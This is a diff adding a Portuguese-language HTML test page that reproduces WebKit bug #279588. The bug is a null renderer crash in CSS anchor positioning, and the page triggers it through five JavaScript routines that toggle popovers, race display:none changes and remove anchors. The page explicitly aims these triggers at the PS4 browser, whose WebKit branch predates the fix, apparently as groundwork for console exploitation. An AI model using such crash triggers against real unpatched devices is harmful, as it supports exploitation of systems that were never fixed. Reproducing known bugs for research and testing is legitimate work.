@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Bug #3: CSS Anchor Positioning — renderer() nullptr</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030305;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff6600;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.source-box{background:#050a05;border:2px solid #00aa44;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#44cc88;line-height:1.8;font-family:monospace}
+.source-box strong{color:#00ff66;display:block;margin-bottom:4px;font-size:11px}
+.info{background:#080808;border:1px solid #222200;border-radius:5px;padding:10px;margin-bottom:12px;font-size:11px;color:#aa9966;line-height:1.6}
+#log{background:#060608;border:1px solid #1a1a2a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:400px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.warn{color:#ffaa00}.err{color:#ff4444}.i2{color:#4488ff}.sep{color:#222}
+.btn{display:inline-block;margin-top:10px;margin-right:6px;padding:7px 14px;background:#0d0800;border:1px solid #332200;border-radius:4px;color:#cc8844;cursor:pointer;font-family:'Courier New',monospace;font-size:11px}
+.btn:hover{border-color:#ff6600;color:#ff8800}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+
+/* Elementos de teste da feature */
+#anchor-el{width:100px;height:40px;background:#112233;border:1px solid #224466;border-radius:3px;margin:6px 0;padding:5px;font-size:10px;color:#aabbcc;display:flex;align-items:center;justify-content:center}
+#popover-el{background:#0a1a0a;border:1px solid #224422;border-radius:4px;padding:8px;width:150px;font-size:10px;color:#88cc88}
+</style>
+</head>
+<body>
+<h1>🟠 Bug #3 — CSS Anchor Positioning: renderer() nullptr Crash</h1>
+<p class="meta">Fonte: bugs.webkit.org #279588 · Pawel Lampe Set/2024 · Fix: commit ba8e7f03 (Out/2024) · SEM CVE</p>
+
+<div class="source-box">
+<strong>🐛 BUGZILLA #279588 (bugs.webkit.org/show_bug.cgi?id=279588)</strong>
+REPORTADO: Pawel Lampe — 12/09/2024<br>
+CRASH EM:  StyleTreeResolver.cpp:1340 → element.renderer() retorna nullptr<br>
+TRIGGER:   Popover com anchor-positioning sendo escondido (2 cliques no botão)<br>
+FIX:       commit ba8e7f03 (285334@main) em 17/10/2024<br>
+FIX IMPL:  AnchorPositionEvaluator.cpp — skip elemento se renderer() == nullptr<br>
+           "When anchor-positioned element is hidden using display:none,<br>
+            there's no point processing it in anchoring anymore."<br>
+<br>
+RELEVÂNCIA PS4: Branch Safari 17 (Set/2023) → ANTERIOR ao fix de Out/2024
+</div>
+
+<div class="info">
+  <strong style="color:#ff8800">Mecanismo:</strong> O CSS Anchor Positioning está em desenvolvimento ativo no WebKit.
+  Quando um popover com anchor está sendo escondido via <code>display:none</code> ou
+  <code>popover.hidePopover()</code>, o <code>StyleTreeResolver</code> tenta processar o
+  elemento para anchor positioning, mas o <code>renderer()</code> retorna nullptr porque
+  o elemento já está sendo destruído. O null deref causa crash no WebProcess.
+  O PS4 usa o branch anterior ao fix — este crash <strong>nunca foi testado na cena PS4</strong>.
+</div>
+
+<!-- Elementos de teste -->
+<div id="anchor-el">anchor-element</div>
+<div id="popover-el" popover>Popover content</div>
+
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="testPopoverAnchor()">① Popover + Anchor (original #279588)</button>
+  <button class="btn" onclick="testDisplayNoneRace()">② display:none Race</button>
+  <button class="btn" onclick="testAnchorRemove()">③ Anchor Removal During Layout</button>
+  <button class="btn" onclick="testMultiPopover()">④ Multi-Popover Chain</button>
+  <button class="btn" onclick="testHideShow()">⑤ Hide/Show Rapid Cycle</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+(t||'')+'─────────────────────','sep')}
+
+// Verifica suporte a CSS Anchor Positioning
+function supportsAnchor(){
+  return CSS && CSS.supports && CSS.supports('anchor-name','--x');
+}
+function supportsPopover(){
+  return typeof HTMLElement.prototype.showPopover === 'function';
+}
+
+// TESTE 1: Reprodução do Bugzilla #279588
+function testPopoverAnchor(){
+  sep('Reprodução Bugzilla #279588');
+  l('anchor positioning + popover → 2 toggles → crash','warn');
+
+  if(!supportsPopover()){
+    l('Popover API NÃO suportada — feature ausente no PS4','warn'); return;
+  }
+  l('Popover API: SUPORTADA ✓','ok');
+
+  if(!supportsAnchor()){
+    l('CSS anchor-name: NÃO suportado (esperado no PS4 FW 13.04)','warn');
+    l('→ Bug #279588 requer anchor positioning habilitado','warn');
+    l('→ Testando variante com position-anchor fallback...','i2');
+  } else {
+    l('CSS anchor-name: SUPORTADO ✓ — testando crash direto','ok');
+  }
+
+  try {
+    // Cria anchor + popover programaticamente
+    var anchor = document.createElement('button');
+    anchor.id = 'poc-anchor-'+Date.now();
+    anchor.textContent = 'Anchor';
+    anchor.style.cssText = 'anchor-name: --poc-anchor; position:relative;';
+    document.body.appendChild(anchor);
+
+    var pop = document.createElement('div');
+    pop.setAttribute('popover', '');
+    pop.style.cssText = [
+      'position:absolute',
+      'position-anchor: --poc-anchor',
+      'top: anchor(bottom)',
+      'left: anchor(left)',
+      'width:100px',
+      'background:#112211',
+      'border:1px solid #44aa44',
+      'padding:5px'
+    ].join(';');
+    pop.textContent = 'Popover';
+    document.body.appendChild(pop);
+
+    l('Anchor + Popover criados com CSS anchor positioning','i2');
+
+    // Primeiro toggle (mostra)
+    l('Toggle #1: showPopover()','i2');
+    try { pop.showPopover(); } catch(e1){ l('showPopover falhou: '+e1.message,'warn'); }
+
+    // Segundo toggle (esconde) → trigger do crash segundo Pawel Lampe
+    setTimeout(function(){
+      l('Toggle #2: hidePopover() — TRIGGER DO CRASH #279588','warn');
+      try {
+        pop.hidePopover();
+        l('hidePopover() retornou sem crash','ok');
+        // Força relayout para manifestar o bug
+        document.body.offsetHeight;
+        l('Relayout forçado sem crash','ok');
+      } catch(e2){
+        l('CRASH em hidePopover(): '+e2.name+' — '+e2.message,'err');
+        l('→ BUG #279588 CONFIRMADO neste WebKit!','err');
+      }
+
+      // Terceiro toggle — segunda tentativa para garantir crash
+      setTimeout(function(){
+        l('Toggle #3: show novamente...','i2');
+        try { pop.showPopover(); } catch(e){}
+        setTimeout(function(){
+          l('Toggle #4: hide final...','warn');
+          try {
+            pop.hidePopover();
+            l('Todos os toggles sem crash','ok');
+          } catch(e3){
+            l('CRASH no toggle 4: '+e3.name,'err');
+          }
+          if(anchor.parentNode) document.body.removeChild(anchor);
+          if(pop.parentNode) document.body.removeChild(pop);
+        }, 100);
+      }, 100);
+    }, 200);
+
+  } catch(e){ l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+// TESTE 2: display:none race durante anchor layout
+function testDisplayNoneRace(){
+  sep('display:none Race com Anchor');
+  l('Alternando display:none rapidamente com anchor-positioned element...','warn');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:relative;width:200px;';
+    document.body.appendChild(container);
+
+    var anchor = document.createElement('div');
+    anchor.style.cssText = 'width:100px;height:30px;background:#112;anchor-name:--race-anchor;';
+    container.appendChild(anchor);
+
+    var anchored = document.createElement('div');
+    anchored.style.cssText = [
+      'position:absolute',
+      'width:80px;height:20px;background:#121',
+      'position-anchor:--race-anchor',
+      'top:anchor(bottom)'
+    ].join(';');
+    container.appendChild(anchored);
+
+    var count = 0;
+    var crashed = false;
+    function toggleDisplay(){
+      if(count >= 40 || crashed) {
+        if(container.parentNode) document.body.removeChild(container);
+        if(!crashed) l('display:none race: '+count+' ciclos sem crash','ok');
+        return;
+      }
+      count++;
+      try {
+        anchored.style.display = (count%2===0)?'none':'block';
+        anchor.style.display = (count%3===0)?'none':'block';
+        container.offsetHeight; // força relayout
+      } catch(e){
+        crashed = true;
+        l('CRASH no ciclo '+count+': '+e.name+' — '+e.message,'err');
+      }
+      requestAnimationFrame(toggleDisplay);
+    }
+    requestAnimationFrame(toggleDisplay);
+    l('40 ciclos de display:none race iniciados...','i2');
+  } catch(e){ l('EXCEÇÃO: '+e.name,'err'); }
+}
+
+// TESTE 3: Remoção do anchor durante layout
+function testAnchorRemove(){
+  sep('Anchor Removal During Layout');
+  l('Removendo anchor element durante recalc de positioned elements...','warn');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:relative;width:300px;height:200px;';
+    document.body.appendChild(container);
+
+    var anchors = [];
+    var positioned = [];
+    for(var i=0;i<5;i++){
+      var a = document.createElement('div');
+      a.style.cssText = 'position:relative;width:50px;height:20px;background:#112;anchor-name:--anc'+i+';';
+      container.appendChild(a);
+      anchors.push(a);
+
+      var p = document.createElement('div');
+      p.style.cssText = 'position:absolute;width:40px;height:15px;background:#121;position-anchor:--anc'+i+';top:anchor(bottom);';
+      container.appendChild(p);
+      positioned.push(p);
+    }
+
+    container.offsetHeight; // layout inicial
+
+    var removed = 0;
+    function removeAnchor(){
+      if(removed >= anchors.length){
+        if(container.parentNode) document.body.removeChild(container);
+        l('Anchor removal: '+removed+' anchors removidos sem crash','ok');
+        return;
+      }
+      try {
+        // Remove anchor enquanto positioned elements ainda existem
+        var a = anchors[removed];
+        if(a.parentNode) container.removeChild(a);
+        removed++;
+        // Força relayout imediato
+        container.offsetHeight;
+        // Acessa positioned element que perdeu seu anchor
+        var pos = positioned[removed-1];
+        var rect = pos.getBoundingClientRect();
+      } catch(e){
+        l('CRASH na remoção do anchor #'+removed+': '+e.name,'err');
+        if(container.parentNode) document.body.removeChild(container);
+        return;
+      }
+      requestAnimationFrame(removeAnchor);
+    }
+    requestAnimationFrame(removeAnchor);
+    l('Remoção sequencial de '+anchors.length+' anchors iniciada...','i2');
+  } catch(e){ l('EXCEÇÃO: '+e.name,'err'); }
+}
+
+// TESTE 4: Cadeia de popovers aninhados
+function testMultiPopover(){
+  sep('Multi-Popover Chain');
+  l('Cadeia de 3 popovers com anchor positioning...','warn');
+  if(!supportsPopover()){l('Popover ausente','warn');return}
+  try {
+    var pops = [];
+    for(var i=0;i<3;i++){
+      var p = document.createElement('div');
+      p.setAttribute('popover','');
+      p.id = 'chain-pop-'+i;
+      p.style.cssText = 'width:80px;height:30px;background:#0a0a'+i+'0;position:absolute;top:anchor(bottom);position-anchor:--chain-'+(i-1)+';anchor-name:--chain-'+i+';';
+      p.textContent = 'Pop '+i;
+      document.body.appendChild(p);
+      pops.push(p);
+    }
+
+    // Abre todos
+    pops.forEach(function(p){try{p.showPopover();}catch(e){}});
+    l('3 popovers abertos em cadeia','i2');
+
+    // Fecha em ordem reversa rapidamente
+    setTimeout(function(){
+      pops.slice().reverse().forEach(function(p,idx){
+        setTimeout(function(){
+          try{
+            p.hidePopover();
+            l('Pop escondido: '+p.id,'ok');
+          }catch(e){
+            l('CRASH em '+p.id+': '+e.name,'err');
+          }
+        },idx*50);
+      });
+      setTimeout(function(){
+        pops.forEach(function(p){if(p.parentNode)document.body.removeChild(p);});
+        l('Multi-Popover Chain: concluído','ok');
+      },300);
+    },200);
+  } catch(e){ l('EXCEÇÃO: '+e.name,'err'); }
+}
+
+// TESTE 5: Ciclo hide/show rápido
+function testHideShow(){
+  sep('Hide/Show Rapid Cycle');
+  l('50 ciclos show/hide em popover com anchor...','warn');
+  if(!supportsPopover()){l('Popover ausente','warn');return}
+  try {
+    var a = document.createElement('div');
+    a.style.cssText = 'width:60px;height:25px;background:#112;anchor-name:--hs-anchor;';
+    document.body.appendChild(a);
+    var p = document.createElement('div');
+    p.setAttribute('popover','');
+    p.style.cssText = 'position:absolute;top:anchor(bottom);left:anchor(left);position-anchor:--hs-anchor;width:50px;height:20px;background:#121;';
+    document.body.appendChild(p);
+
+    var cycle = 0, maxCycles = 50, crashed = false;
+    function cycle_fn(){
+      if(cycle>=maxCycles||crashed){
+        if(a.parentNode)document.body.removeChild(a);
+        if(p.parentNode)document.body.removeChild(p);
+        if(!crashed)l('Hide/Show: '+cycle+' ciclos sem crash','ok');
+        return;
+      }
+      cycle++;
+      try{
+        if(cycle%2===0) p.showPopover();
+        else p.hidePopover();
+      }catch(e){
+        // "already shown/hidden" errors são normais
+        if(e.name!=='InvalidStateError'){
+          crashed=true;
+          l('CRASH no ciclo '+cycle+': '+e.name+' — '+e.message,'err');
+          if(a.parentNode)document.body.removeChild(a);
+          if(p.parentNode)document.body.removeChild(p);
+          return;
+        }
+      }
+      requestAnimationFrame(cycle_fn);
+    }
+    try{p.showPopover();}catch(e){}
+    requestAnimationFrame(cycle_fn);
+    l('50 ciclos show/hide iniciados...','i2');
+  }catch(e){l('EXCEÇÃO: '+e.name,'err');}
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ TODOS OS TESTES — Bug #279588 CSS Anchor Positioning','warn');
+  l('Fix: ba8e7f03 (Out/2024) — PS4 branch Set/2023 ANTERIOR ao fix','i2');
+  setTimeout(testPopoverAnchor,50);
+  setTimeout(testDisplayNoneRace,2000);
+  setTimeout(testAnchorRemove,4000);
+  setTimeout(testMultiPopover,6000);
+  setTimeout(testHideShow,8000);
+}
+</script>
+</body>
+</html>
